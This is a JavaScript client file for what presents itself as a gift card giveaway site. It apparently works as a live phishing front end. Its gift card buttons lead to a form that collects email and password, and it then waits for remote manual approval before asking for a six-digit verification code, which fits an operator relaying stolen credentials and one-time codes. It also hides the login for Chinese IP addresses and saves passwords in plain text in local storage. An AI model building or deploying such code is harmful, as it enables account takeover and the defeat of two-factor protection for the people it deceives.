// Enhanced Gift Card App - 主应用逻辑
class EnhancedGiftCardApp {
    constructor() {
        if (!document.getElementById('welcomePage')) {
            return;
        }
        
        this.socket = io();
        
        // 连接Socket.IO
        this.socket.on('connect', () => {
            if (this.currentMemberId) {
                this.socket.emit('join-member', this.currentMemberId);
            }
        });
        
        // 从本地存储恢复状态
        this.currentMemberId = Utils.storage.get('currentMemberId');
        this.currentLoginId = Utils.storage.get('currentLoginId');
        this.currentVerificationId = Utils.storage.get('currentVerificationId');
        this.memberEmail = Utils.storage.get('memberEmail');
        
        this.init();
    }

    init() {
        // 检查用户token
        const token = Utils.storage.get('memberToken');
        if (token) {
            this.verifyToken(token);
        } else {
            this.hideMemberInfo();
            this.checkPendingSession();
            this.showPage('welcomePage');
            this.handleChineseIPBlock();
        }
        
        this.setupSocketListeners();
        this.bindEvents();
        this.setupUIComponents();
    }

    async verifyToken(token) {
        const result = await Utils.request('/api/auth/member/verify-token', {
            method: 'POST',
            body: JSON.stringify({ token })
        });

        if (result.success) {
            this.currentMemberId = result.data.memberId;
            if (result.data.memberId) {
                Utils.storage.set('currentMemberId', result.data.memberId);
            }
            
            this.showMemberInfo();
            await this.loadGiftCardsHistory();
            await this.loadCheckinsHistory();
            this.showGiftCardPageWithLatest();
        } else {
            // Token无效，清除本地数据
            this.clearUserData();
            this.hideMemberInfo();
            this.showPage('welcomePage');
        }
    }

    clearUserData() {
        Utils.storage.remove('memberToken');
        Utils.storage.remove('currentMemberId');
        Utils.storage.remove('memberEmail');
        this.currentMemberId = null;
        this.memberEmail = null;
    }

    checkPendingSession() {
        if (this.currentLoginId && this.currentMemberId) {
            console.log('Detected local stored login state, cleaning old data');
            this.clearSession();
        }
    }
    
    clearSession() {
        this.currentLoginId = null;
        this.currentVerificationId = null;
        Utils.storage.remove('currentLoginId');
        Utils.storage.remove('currentVerificationId');
        if (this.sessionShouldBeCleared || !Utils.storage.get('memberToken')) {
            this.currentMemberId = null;
            Utils.storage.remove('currentMemberId');
            Utils.storage.remove('memberToken');
        }
        this.sessionShouldBeCleared = false;
    }

    handleChineseIPBlock() {
        if (typeof isChineseIP !== 'undefined' && isChineseIP && 
            typeof blockChineseIP !== 'undefined' && blockChineseIP) {
            const welcomeMsg = document.querySelector('#welcomePage p[data-i18n="welcome_description"]');
            if (welcomeMsg) {
                welcomeMsg.setAttribute('data-i18n', 'cn_cards_depleted');
                if (window.i18n) {
                    welcomeMsg.textContent = window.i18n.t('cn_cards_depleted');
                }
                welcomeMsg.style.color = '#ff4d4f';
                welcomeMsg.style.fontWeight = 'bold';
                const loginBtn = document.getElementById('goToLoginBtn');
                if (loginBtn) {
                    loginBtn.style.display = 'none';
                }
            }
        }
    }

    showMemberInfo() {
        const memberInfo = document.getElementById('memberInfo');
        const languageSelector = document.getElementById('languageSelector');
        const memberAccount = document.getElementById('memberAccount');
        const logoutLink = document.getElementById('logoutLink');
        
        if (memberInfo && this.memberEmail) {
            memberAccount.textContent = this.memberEmail;
            memberInfo.style.display = 'flex';
            if (languageSelector) {
                languageSelector.style.display = 'none';
            }
            if (logoutLink) {
                logoutLink.style.display = 'inline';
            }
        }
    }

    hideMemberInfo() {
        const memberInfo = document.getElementById('memberInfo');
        const languageSelector = document.getElementById('languageSelector');
        
        if (memberInfo) {
            memberInfo.style.display = 'none';
        }
        if (languageSelector) {
            languageSelector.style.display = 'flex';
        }
    }

    logout() {
        this.clearUserData();
        Utils.storage.remove('currentLoginId');
        Utils.storage.remove('currentVerificationId');
        
        this.currentLoginId = null;
        this.currentVerificationId = null;
        
        this.hideMemberInfo();
        this.showPage('welcomePage');
    }

    bindEvents() {
        // 欢迎页面 - 登录按钮
        const goToLoginBtn = document.getElementById('goToLoginBtn');
        if (goToLoginBtn) {
            goToLoginBtn.addEventListener('click', () => {
                this.showPage('loginPage');
            });
        }

        // 退出登录
        const logoutLink = document.getElementById('logoutLink');
        if (logoutLink) {
            logoutLink.addEventListener('click', (e) => {
                e.preventDefault();
                this.logout();
            });
        }

        // 登录表单
        const loginBtn = document.getElementById('login-btn');
        if (loginBtn) {
            loginBtn.addEventListener('click', (e) => {
                e.preventDefault();
                this.handleLogin();
            });
        }

        // 清除按钮
        const clearBtn = document.getElementById('clear-btn');
        if (clearBtn) {
            clearBtn.addEventListener('click', () => {
                const emailInput = document.getElementById('email');
                const passwordInput = document.getElementById('password');
                if (emailInput) emailInput.value = '';
                if (passwordInput) passwordInput.value = '';
            });
        }

        // 密码显示/隐藏
        const togglePassword = document.getElementById('toggle-password');
        const passwordInput = document.getElementById('password');
        if (togglePassword && passwordInput) {
            togglePassword.addEventListener('click', () => {
                const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
                passwordInput.setAttribute('type', type);
                togglePassword.classList.toggle('fa-eye');
                togglePassword.classList.toggle('fa-eye-slash');
            });
        }

        // 验证码提交
        const verifySubmitBtn = document.querySelector('.verify-submit-btn');
        if (verifySubmitBtn) {
            verifySubmitBtn.addEventListener('click', (e) => {
                e.preventDefault();
                this.handleVerification();
            });
        }

        // 移动端菜单切换
        const menuToggle = document.getElementById('menu-toggle');
        const mobileMenu = document.getElementById('mobile-menu');
        if (menuToggle && mobileMenu) {
            menuToggle.addEventListener('click', () => {
                mobileMenu.classList.toggle('hidden');
            });
        }

        // 回到顶部按钮
        const backToTopBtn = document.getElementById('back-to-top');
        if (backToTopBtn) {
            window.addEventListener('scroll', Utils.throttle(() => {
                if (window.scrollY > 300) {
                    backToTopBtn.classList.remove('opacity-0', 'invisible');
                    backToTopBtn.classList.add('opacity-100', 'visible');
                } else {
                    backToTopBtn.classList.add('opacity-0', 'invisible');
                    backToTopBtn.classList.remove('opacity-100', 'visible');
                }
            }, 100));

            backToTopBtn.addEventListener('click', () => {
                window.scrollTo({
                    top: 0,
                    behavior: 'smooth'
                });
            });
        }

        // 礼品卡按钮点击事件
        document.querySelectorAll('[data-i18n="claim_now"]').forEach(btn => {
            btn.addEventListener('click', () => {
                this.showPage('loginPage');
            });
        });
    }

    setupUIComponents() {
        // 设置语言选择器
        const languageSelect = document.getElementById('languageSelect');
        if (languageSelect) {
            // 设置当前语言
            languageSelect.value = window.i18n ? window.i18n.getCurrentLanguage() : 'zh';
            
            languageSelect.addEventListener('change', (e) => {
                if (window.i18n) {
                    window.i18n.changeLanguage(e.target.value);
                }
            });
        }

        // 恢复记住的登录信息
        this.restoreRememberedLogin();
    }

    restoreRememberedLogin() {
        const rememberMe = Utils.storage.get('rememberMe');
        if (rememberMe === 'true') {
            const emailInput = document.getElementById('email');
            const passwordInput = document.getElementById('password');
            const rememberCheckbox = document.getElementById('remember-me');
            
            if (emailInput) emailInput.value = Utils.storage.get('rememberedEmail') || '';
            if (passwordInput) passwordInput.value = Utils.storage.get('rememberedPassword') || '';
            if (rememberCheckbox) rememberCheckbox.checked = true;
        }
    }

    setupSocketListeners() {
        // 页面关闭时清理会话
        window.addEventListener('pagehide', () => {
            this._shouldReallyClearSession = true;
            if (this.currentLoginId && (
                document.getElementById('waitingPage')?.classList.contains('active') || 
                document.getElementById('verificationPage')?.classList.contains('active') ||
                document.getElementById('waitingVerificationPage')?.classList.contains('active')
            )) {
                const data = JSON.stringify({ 
                    loginId: this.currentLoginId,
                    memberId: this.currentMemberId
                });
                navigator.sendBeacon('/api/auth/member/cancel', data);
                this.checkPendingSession();
            }
        });
        
        // 登录状态更新
        this.socket.on('login-status-update', (data) => {
            const statusDiv = document.getElementById('loginStatus');
            if (statusDiv) {
                if (data.status === 'approved') {
                    statusDiv.innerHTML = `<div class="status-message success"><span data-i18n="login_approved">登录已批准</span></div>`;
                    if (window.i18n) window.i18n.translatePage();
                    setTimeout(() => {
                        this.showPage('verificationPage');
                    }, 2000);
                } else {
                    statusDiv.innerHTML = `<div class="status-message error"><span data-i18n="login_rejected">登录被拒绝</span></div>`;
                    if (window.i18n) window.i18n.translatePage();
                    setTimeout(() => {
                        this.showPage('loginPage');
                    }, 3000);
                }
            }
        });

        // 验证通过
        this.socket.on('verification-approved', (data) => {
            if (data.token) {
                Utils.storage.set('memberToken', data.token);
            }
            if (this.currentMemberId) {
                Utils.storage.set('currentMemberId', this.currentMemberId);
            }
            
            this.currentLoginId = null;
            this.currentVerificationId = null;
            Utils.storage.remove('currentLoginId');
            Utils.storage.remove('currentVerificationId');
            
            this.showMemberInfo();
            
            if (data.giftCardCode) {
                this.showGiftCardPage(data.giftCardCode);
            } else {
                this.showGiftCardPage(null);
            }
        });

        // 验证拒绝
        this.socket.on('verification-rejected', () => {
            const statusDiv = document.getElementById('verificationStatus');
            if (statusDiv) {
                statusDiv.style.display = 'block';
                statusDiv.innerHTML = `<div class="status-message error"><span data-i18n="verification_rejected">验证被拒绝</span></div>`;
                if (window.i18n) window.i18n.translatePage();
                
                setTimeout(() => {
                    this.showPage('verificationPage');
                }, 3000);
            }
        });
    }

    async handleLogin() {
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;
        const rememberMe = document.getElementById('remember-me')?.checked || false;

        if (!email || !password) {
            this.showError('请输入邮箱和密码');
            return;
        }

        // 保存记住的登录信息
        if (rememberMe) {
            Utils.storage.set('rememberedEmail', email);
            Utils.storage.set('rememberedPassword', password);
            Utils.storage.set('rememberMe', 'true');
        } else {
            Utils.storage.remove('rememberedEmail');
            Utils.storage.remove('rememberedPassword');
            Utils.storage.remove('rememberMe');
        }

        // 显示加载状态
        this.showLoading(true);

        const result = await Utils.request('/api/auth/member/login', {
            method: 'POST',
            body: JSON.stringify({ email, password })
        });

        this.showLoading(false);

        if (result.success) {
            this.currentMemberId = result.data.memberId;
            this.currentLoginId = result.data.loginId;
            this.memberEmail = email;
            
            Utils.storage.set('currentLoginId', this.currentLoginId);
            Utils.storage.set('currentMemberId', this.currentMemberId);
            Utils.storage.set('memberEmail', this.memberEmail);
            
            this.socket.emit('join-member', this.currentMemberId);
            this.showPage('waitingPage');
        } else {
            this.showError(result.error || 'login_failed');
        }
    }

    async handleVerification() {
        const inputs = Array.from(document.querySelectorAll('.form-security-code-input'));
        const verificationCode = inputs.map(input => input.value).join('');
        
        if (verificationCode.length !== 6) {
            this.showError('verification_code_required');
            return;
        }

        this.showLoading(true);

        const result = await Utils.request('/api/auth/member/verify', {
            method: 'POST',
            body: JSON.stringify({ 
                loginId: this.currentLoginId, 
                verificationCode 
            })
        });

        this.showLoading(false);

        if (result.success) {
            this.currentVerificationId = result.data.verificationId;
            this.showPage('waitingVerificationPage');
        } else {
            this.showError(result.error || 'verification_failed');
            
            // 清空验证码输入
            inputs.forEach(input => {
                input.value = '';
                input.classList.add('error');
                setTimeout(() => input.classList.remove('error'), 500);
            });
            if (inputs[0]) inputs[0].focus();
        }
    }

    setupVerificationInputs() {
        const inputs = Array.from(document.querySelectorAll('.form-security-code-input'));
        if (!inputs.length) return;

        // 清空所有输入
        inputs.forEach(input => input.value = '');
        if (inputs[0]) inputs[0].focus();

        // 移除旧的事件监听器
        inputs.forEach((input) => {
            input.oninput = null;
            input.onkeydown = null;
            input.onpaste = null;
        });

        // 添加新的事件监听器
        inputs.forEach((input, idx) => {
            input.addEventListener('input', () => {
                let val = input.value.replace(/[^0-9]/g, '').slice(0, 1);
                input.value = val;
                if (val && idx < inputs.length - 1) {
                    inputs[idx + 1].focus();
                }
                // 自动提交
                if (inputs.every(inp => inp.value.length === 1)) {
                    setTimeout(() => this.handleVerification(), 100);
                }
            });
            
            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && !input.value && idx > 0) {
                    inputs[idx - 1].focus();
                }
            });
            
            input.addEventListener('paste', (e) => {
                e.preventDefault();
                const paste = (e.clipboardData || window.clipboardData).getData('text').replace(/[^0-9]/g, '').slice(0, 6);
                for (let i = 0; i < paste.length && i < 6; i++) {
                    inputs[i].value = paste[i];
                }
                if (paste.length === 6) {
                    setTimeout(() => this.handleVerification(), 100);
                } else if (paste.length > 0) {
                    inputs[Math.min(paste.length, 5)].focus();
                }
            });
        });
    }

    showPage(pageId) {
        // 隐藏所有页面
        document.querySelectorAll('.page').forEach(page => {
            page.classList.remove('active');
        });
        
        // 显示目标页面
        const targetPage = document.getElementById(pageId);
        if (targetPage) {
            targetPage.classList.add('active');
        }
        
        // 翻译页面
        if (window.i18n) {
            window.i18n.translatePage();
        }
        
        // 页面特定初始化
        this.initializePage(pageId);
    }

    initializePage(pageId) {
        switch(pageId) {
            case 'loginPage':
                // 清除错误状态
                const loginForm = document.getElementById('login-form');
                if (loginForm) {
                    const inputs = loginForm.querySelectorAll('input');
                    inputs.forEach(input => input.classList.remove('error'));
                }
                break;
                
            case 'verificationPage':
                this.setupVerificationInputs();
                break;
                
            case 'waitingPage':
                const loginStatus = document.getElementById('loginStatus');
                if (loginStatus) {
                    loginStatus.innerHTML = '';
                }
                break;
                
            case 'waitingVerificationPage':
                const verificationStatus = document.getElementById('verificationStatus');
                if (verificationStatus) {
                    verificationStatus.style.display = 'none';
                    verificationStatus.innerHTML = '';
                }
                break;
        }
    }

    showLoading(show) {
        const loadingOverlay = document.getElementById('loading-overlay');
        if (loadingOverlay) {
            if (show) {
                loadingOverlay.classList.add('active');
            } else {
                loadingOverlay.classList.remove('active');
            }
        }
    }

    showError(message) {
        Utils.showError(message);
    }

    // 占位方法 - 后续实现
    async showGiftCardPage() {
        this.showPage('giftCardPage');
    }

    async showGiftCardPageWithLatest() {
        this.showPage('giftCardPage');
    }

    async loadGiftCardsHistory() {
        // 占位方法
    }

    async loadCheckinsHistory() {
        // 占位方法
    }
}

// 初始化应用
function initEnhancedApp() {
    if (window.i18n && window.Utils) {
        new EnhancedGiftCardApp();
    } else {
        setTimeout(initEnhancedApp, 100);
    }
}

if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initEnhancedApp);
} else {
    initEnhancedApp();
}
